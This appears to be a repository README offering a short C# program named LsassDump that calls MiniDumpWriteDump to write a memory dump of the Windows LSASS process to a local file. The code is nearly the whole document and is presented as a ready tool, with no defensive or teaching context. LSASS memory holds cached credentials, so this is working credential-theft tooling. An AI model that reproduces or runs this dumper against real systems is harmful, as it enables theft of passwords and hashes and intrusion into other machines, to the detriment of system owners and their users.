# LsassDump
A Simple C# Program to dump LSASS

```c
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace LsassDump
{
    public static class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        static void Main(string[] args)
        {
            Process[] lsass = Process.GetProcessesByName("lsass");
            int pid = lsass[0].Id;

            IntPtr hProcess = lsass[0].Handle;
            FileStream dumpFile = new FileStream(".\\lsass.dmp", FileMode.Create);
            IntPtr hFile = dumpFile.SafeFileHandle.DangerousGetHandle();

            bool success = MiniDumpWriteDump(hProcess, pid, hFile, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
```
